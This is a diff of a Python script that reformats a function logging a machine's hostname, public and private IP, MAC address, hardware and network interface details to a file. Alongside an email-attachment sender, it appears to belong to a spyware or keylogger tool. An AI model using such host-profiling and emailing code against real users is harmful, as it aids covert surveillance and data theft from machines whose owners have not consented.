@@ -52,40 +52,43 @@ def send_email(filename, attachment, toaddr):
 
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
-        hostname = socket.gethostname()
-        privateIP = socket.gethostbyname(hostname)
         swap = psutil.swap_memory()
-        f.write(f"Time: {current_time()}\n")
-        f.write("------------------------------------\n")
+        f.write(f"Time:{current_time()}\n\n")
         try:
             publicIP = get("https://api.ipify.org").text
-            f.write(f"Public IP Address {publicIP}\n")
+            f.write(f"""        Public IP Address {publicIP}""")
         except Exception:
             f.write("Couldn't get Public IP Address")
-        f.write(f"Private IP Address: {privateIP}\n")
-        f.write(
-            f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n")
-        f.write(f"CPU: {platform.processor()}\n")
-        f.write(f"System: {platform.system()} {platform.version()}\n")
-        f.write(f"Machine: {platform.machine()}\n")
-        f.write(f"Hostname: {hostname}\n")
-        f.write(f"Total: {get_size(swap.total)}\n")
-        f.write(f"Free: {get_size(swap.free)}\n")
-        f.write(f"Used: {get_size(swap.used)}\n")
-        f.write(f"Percentage: {swap.percent}%\n")
+        f.write(f"""
+        Private IP Address: {socket.gethostbyname(socket.gethostname())}
+        Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n""")
+    
+        f.write(f"""
+        CPU: {platform.processor()}
+        System: {platform.system()} {platform.version()}
+        Machine: {platform.machine()}
+        Hostname: {socket.gethostname()}
+        Total: {get_size(swap.total)}
+        Free: {get_size(swap.free)}
+        Used: {get_size(swap.used)}
+        Percentage: {swap.percent}\n\n""")
+        
         f.write("----------------INTETFACE ADDRESS--------------------\n")
         if_addrs = psutil.net_if_addrs()
         for interface_name, interface_addresses in if_addrs.items():
             for address in interface_addresses:
                 f.write((f"=== Interface: {interface_name} ===\n"))
                 if str(address.family) == 'AddressFamily.AF_INET':
-                    f.write((f"  IP Address: {address.address}\n"))
-                    f.write((f"  Netmask: {address.netmask}\n"))
-                    f.write((f"  Broadcast IP: {address.broadcast}\n"))
+                    f.write((f"""  
+                    IP Address: {address.address}
+                    Netmask: {address.netmask}
+                    Broadcast IP: {address.broadcast}\n\n"""))
                 elif str(address.family) == 'AddressFamily.AF_PACKET':
-                    f.write((f"  MAC Address: {address.address}\n"))
-                    f.write((f"  Netmask: {address.netmask}\n"))
-                    f.write((f"  Broadcast MAC: {address.broadcast}\n"))
+                    f.write((f"""  
+                    MAC Address: {address.address}
+                    Netmask: {address.netmask}
+                    Broadcast MAC: {address.broadcast}\n\n"""))
+                  
         f.write("------------------------------------\n")
 
 
